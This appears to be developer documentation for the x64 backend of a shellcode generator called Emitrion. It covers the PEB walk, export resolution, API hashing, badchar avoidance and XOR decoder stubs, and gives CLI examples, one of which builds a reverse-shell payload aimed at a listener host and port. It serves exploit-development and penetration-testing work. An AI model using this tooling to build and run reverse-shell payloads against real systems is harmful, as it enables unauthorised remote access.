# Windows x64 Backend

## Overview

The x64 backend extends the Emitrion shellcode emitter with position-independent
Windows x64 shellcode generation. It reuses the existing intermediate representation
(IR), workflow definitions, API catalog, and validator, adding architecture-specific
components for the Microsoft x64 calling convention, 64-bit encoding, RSP-relative
stack addressing, GS-based PEB access, and PE32+ export parsing.

## Architecture

```
manifest.yaml (arch: x64)
  -> schema.py (load, validate x64 registers)
  -> stack_alloc_x64.py (RSP-relative zones)
  -> build_x64.py:compose_asm_x64() orchestrates:
       1. Framework stubs (GS PEB walk, PE32+ export resolution)
       2. API resolution stubs per function (hash-based)
       3. Module loading (LoadLibraryA calls)
       4. String construction (dword-chunked, badchar-safe)
       5. Structure initialization (rep stosq or inline)
       6. Payload assembly (workflow IR lowered to x64)
  -> build_x64.py:build_x64() (Keystone x64 assembly, contract doc, debug runner)
```

## Microsoft x64 Calling Convention

| Aspect | Detail |
|--------|--------|
| Integer args 0-3 | RCX, RDX, R8, R9 |
| Integer args 4+ | Stack at [RSP+0x20], [RSP+0x28], ... |
| Shadow space | 32 bytes always reserved at [RSP+0x00..0x1F] |
| Return value | RAX |
| Stack alignment | 16-byte aligned at CALL instruction |
| Volatile regs | RAX, RCX, RDX, R8, R9, R10, R11 |
| Non-volatile | RBX, RBP, RDI, RSI, R12-R15 |

## Stack Frame Layout (RSP-relative)

```
[RSP + 0x000..0x01F]  Shadow space (32 bytes, always reserved)
[RSP + 0x020..0x03F]  Shadow space extension (for stack args beyond 4)
[RSP + 0x040..]       Module base pointers (8 bytes each)
                       API function pointers (8 bytes each)
                       Variables (8 bytes each)
[RSP + 0x100..]       Structures (8-byte aligned)
                       Strings (8-byte aligned)
```

Frame size is 16-byte aligned, maximum 0x2000 (2 pages).

## x64 PEB Walk

Access via `GS:[0x60]` (x64) instead of `FS:[0x30]` (x86):

```
GS:[0x60]           -> PEB
PEB + 0x18          -> PEB_LDR_DATA
PEB_LDR_DATA + 0x30 -> InInitializationOrderModuleList.Flink
```

Module enumeration checks UTF-16LE module names for KERNEL32.DLL (first char K=0x004B,
second char E=0x0045, seventh char 3=0x0033).

## PE32+ Export Parsing

```
ImageBase + 0x3C     -> e_lfanew (PE signature offset)
PE + 0x88            -> Export Directory RVA (DataDirectory[0], PE32+ offset)
Export Dir + 0x18    -> NumberOfNames
Export Dir + 0x1C    -> AddressOfFunctions RVA
Export Dir + 0x20    -> AddressOfNames RVA
Export Dir + 0x24    -> AddressOfNameOrdinals RVA
```

## x64 Struct Differences

| Struct | x86 Size | x64 Size | Key Differences |
|--------|----------|----------|-----------------|
| STARTUPINFOA | 0x44 | 0x68 | cb at 0x00 (4B), dwFlags at 0x3c (4B), handles at 0x50/0x58/0x60 (8B each) |
| PROCESS_INFORMATION | 0x10 | 0x18 | hProcess at 0x00 (8B), hThread at 0x08 (8B), PIDs at 0x10/0x14 (4B) |
| sockaddr_in | 0x10 | 0x10 | Same layout |
| WSADATA | 0x190 | 0x190 | Same size, 8-byte alignment |

## Badchar-Safe Encoding

The `encode_x64` module provides:

- `encode_qword`: 64-bit immediate loading with XOR mask fallback
- `encode_dword_into_r64`: 32-bit value via zero-extending mov r32, imm32
- `safe_qword_store`, `safe_dword_store_x64`, `safe_word_store_x64`: Memory stores
- `safe_mem_load_x64`, `safe_lea_x64`, `safe_call_mem_x64`: Loads, LEA, indirect call
- Uses r11 as primary scratch register (volatile, not an argument register)

When a displacement or immediate contains badchars, the encoder splits the value
into an XOR-masked pair where neither half contains forbidden bytes.

## Encoding Pipeline

The emitter supports two encoding strategies, controlled by CLI flags. Both
strategies apply to x86 and x64 builds.

### Inline Badchar Avoidance (default)

Every immediate value and memory displacement is checked against the manifest
badchar set at code generation time. When a value contains a forbidden byte,
the emitter substitutes an equivalent instruction sequence that avoids it:
a `mov reg, encoded_value` followed by `xor reg, mask`, where neither the
encoded value nor the mask contain any badchar bytes.

This is the default behavior. It produces shellcode that is directly usable
without a decoder stub, at the cost of a few extra instructions per encoded
value (typically 2-10 extra instructions depending on the payload).

Framework stubs (PEB walk, export resolution) contain fixed offsets like
`0x3C`, `0x78`, and `0x18` that inline encoding cannot change. These bytes
will always be present in the assembled output regardless of the badchar set.

### Raw Mode (`--raw`)

Skips inline badchar avoidance entirely. All immediates and displacements
are emitted directly, producing the shortest possible assembly. The manifest
badchar set is still recorded for post-assembly validation and XOR encoding.

```bash
# x86
uv run emitrion manifest.yaml --raw --no-assemble --out emitter_out/

# x64
uv run emitrion-x64 manifest_x64.yaml --raw --no-assemble --out emitter_out/
```

From Python:

```python
from emitrion.build import build
result = build("manifest.yaml", assemble=False, raw=True)

from emitrion.build_x64 import build_x64
result = build_x64("manifest_x64.yaml", assemble=False, raw=True)
```

### Whole-Payload XOR Encoding (`--encode`)

When `--encode` is passed and the assembled shellcode contains badchar
violations, the XOR encoder wraps the entire payload in a decoder stub.
The stub XOR-decodes the payload in place at runtime, then falls through
to the clean shellcode.

The encoder searches for a single-byte XOR key where neither the key, the
encoded payload, nor the decoder stub itself contain any badchar bytes.

x86 stubs use the classic `call/pop` + `fnstenv` patterns. x64 stubs use
`call/pop rsi`, REX.W-prefixed `inc rsi` (`48 FF C6`), `xor rcx, rcx`
(`48 31 C9`), and the `loop` instruction (which uses RCX in 64-bit mode).

### Smallest Shellcode: `--raw --encode`

The recommended workflow for production payloads:

1. `--raw` disables inline encoding, producing the shortest possible assembly
2. `--encode` wraps the raw payload in a XOR decoder stub (~25 bytes overhead)

This is smaller than default inline encoding when the payload has more than
2-3 values that would need XOR-mask pairs (each pair adds ~10 bytes).

```bash
uv run emitrion manifest.yaml --raw --encode --out emitter_out/
uv run emitrion-x64 manifest_x64.yaml --raw --encode --out emitter_out/
```

### Standalone XOR Wrapper (`xor_wrapper.py`)

Every build generates a `bin/xor_wrapper.py` script alongside the shellcode
outputs. This is a self-contained Python script that can XOR-encode raw
shellcode offline, on any platform with Python 3.12+. No assembler or
external dependencies are needed.

The wrapper embeds the manifest badchar set and target architecture from the
build. It supports both x86 and x64, custom badchar sets, and forced XOR keys.

```bash
# Encode raw shellcode with manifest defaults
python xor_wrapper.py shellcode.bin

# Custom output path
python xor_wrapper.py shellcode.bin -o encoded.bin

# Override badchars
python xor_wrapper.py shellcode.bin --badchars 00,0a,0d,20

# Force a specific key
python xor_wrapper.py shellcode.bin --key 0x41

# Override architecture
python xor_wrapper.py shellcode.bin --arch x64
```

This is useful when you have raw shellcode from an external source (or
produced with `--raw --no-assemble` and assembled separately) and need to
encode it without re-running the full build pipeline.

## Build Pipeline

### From CLI

```bash
uv run emitrion emitrion/manifests/x64/revshell_x64.yaml --lhost 10.0.0.1 --lport 9001 --no-assemble --out emitter_out/
```

The main `build()` function auto-detects `arch: x64` in the manifest and routes
to `build_x64()`.

### From Python

```python
from emitrion.build_x64 import build_x64
result = build_x64("path/to/manifest_x64.yaml", assemble=False)
print(result.asm)
```

### Outputs

- `asm/generated.asm`: Full x64 assembly source (BITS 64)
- `asm/debug_runner.py`: Self-contained Python script for Windows lab VM
  (uses Keystone KS_MODE_64, 64-bit VirtualAlloc/CreateThread)
- `Documentation/contract.md`: x64 stack layout, API table with hashes

## Manifest Format

```yaml
arch: x64
template: ir_run_command
badchars: ["00", "0A", "0D"]

functions:
  - WinExec

strings:
  - label: cmd
    value: calc.exe
    method: mov
    dest: rdi            # x64 register (default for x64)
```

The `arch: x64` field selects x64 register validation (`rax..r15` instead of
`eax..edi`) and routes through the x64 build pipeline.

## Testing

```bash
# x64 encoding tests
uv run pytest emitrion/tests/test_x64_encode.py -q

# x64 stack allocator tests
uv run pytest emitrion/tests/test_x64_stack_alloc.py -q

# x64 workflow/backend tests
uv run pytest emitrion/tests/test_workflow_x64.py -q

# x64 build pipeline tests
uv run pytest emitrion/tests/test_x64_build.py -q

# All tests (x86 + x64)
uv run pytest emitrion/tests/ -q
```

## Module Map

| Module | Purpose |
|--------|---------|
| `arch.py` | Architecture enum (X86/X64) with ptr_size, bits |
| `encode_x64.py` | Badchar-safe x64 immediate and memory encoding |
| `stack_alloc_x64.py` | RSP-relative stack allocator with 6 zones |
| `workflow/x64_backend.py` | IR lowering to Microsoft x64 calling convention |
| `build_x64.py` | x64 compose pipeline, framework stubs, build entry point |
| `api_database.py` | STRUCT_DATABASE_X64 (x64-specific struct layouts) |
| `schema.py` | arch field, x64 register validation |
| `payload_templates/base.py` | arch-aware probe_slots dispatch |
| `workflow/reference.py` | layout-type dispatch for x64 IR lowering |

## Shared Infrastructure (reused from x86)

- `workflow/ir.py`: Intermediate representation (architecture-neutral)
- `workflow/validator.py`: IR validation
- `workflow/catalog.py`: ABI catalog
- `workflow/reference.py`: Workflow builders (run_command, reverse_shell, etc.)
- `hash_gen.py`: ROR-13 hash computation
- `api_database.py`: API_DATABASE, MODULE_LOAD_ORDER
- `strings.py`: String-to-push-sequence generator
